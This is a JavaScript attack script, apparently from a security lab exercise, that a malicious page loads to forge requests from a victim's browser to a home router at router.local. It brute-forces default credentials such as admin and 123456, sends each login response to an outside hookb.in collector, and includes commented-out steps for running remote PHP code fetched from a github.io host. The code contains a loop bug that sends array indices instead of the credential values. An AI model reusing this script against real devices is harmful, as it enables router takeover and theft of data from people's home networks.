// This us the script linked to from router.pdf.php, which
// forges a request through Bob's router to router.local

const unames = ['admin', 'root', 'cisco'];
const pwords = ['123456', 'admin', 'password', 'secured'];
var breakCheck = false;
let cook = document.cookie;
for (u in unames) {
    for (p in pwords) {
        let http = new XMLHttpRequest();
        let url = cook + '&username=' + u + '&pin=' + p + '&notRobot=on';
        http.open('POST', 'http://router.local/login.php', true);
        //'http://router.local/home.php?action=view&'+cook -> what we http.responseURL if successful login
        //http://router.local/view.php

        //http.open('POST', 'http://router.local/home.php?action=http://nastassiagoodson.github.io/attack&'+cook, true); -> how to run own php code (e.g. ls)
        //http.open('POST', 'http://router.local/setup.php', true);

        http.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

        http.onload = function () {
            let xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://hookb.in/1gdxlYb2j6sd6NOOxnDq', true);
            xhr.setRequestHeader('Content-type', 'application/json');
            xhr.send(JSON.stringify(http.responseURL));
        };

//         http.onreadystatechange = function () {
//             if (http.readyState === XMLHttpRequest.DONE && http.status === 200) {
//                 if (http.responseURL === 'http://router.local/home.php?action=view&' + cook) {
//                     let req = new XMLHttpRequest();
//                     req.open('POST', 'http://router.local/setup.php', true);
//                     req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
//                     req.onload = function () {
//                         let r = new XMLHttpRequest();
//                         r.open('POST', 'https://hookb.in/1gdxlYb2j6sd6NOOxnDq', true);
//                         r.setRequestHeader('Content-type', 'application/json');
//                         r.send(JSON.stringify(http.responseText));
//                     };
//                     req.send();
//                     breakCheck = true;
//                 }
//             }
//         };
        http.send(url);
//         if (breakCheck) {
//             break;
//         }
    }
//     if (breakCheck) {
//         break;
//     }
}


//should be logged in at this point...

//const xhr = new XMLHttpRequest();
//const cook = document.cookie;
//xhr.open('POST', 'http://router.local/home.php?action=http://nastassiagoodson.github.io/attack&'+cook, true);
// xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
// xhr.onload = function () {
//                 const req = new XMLHttpRequest();
//                 req.open('POST', 'https://hookb.in/W1yMQRGygKSYplzz6Rzp', true);
//                 req.setRequestHeader('Content-type', 'application/json');
//                 req.send(JSON.stringify(xhr.response));

// };
// xhr.send();



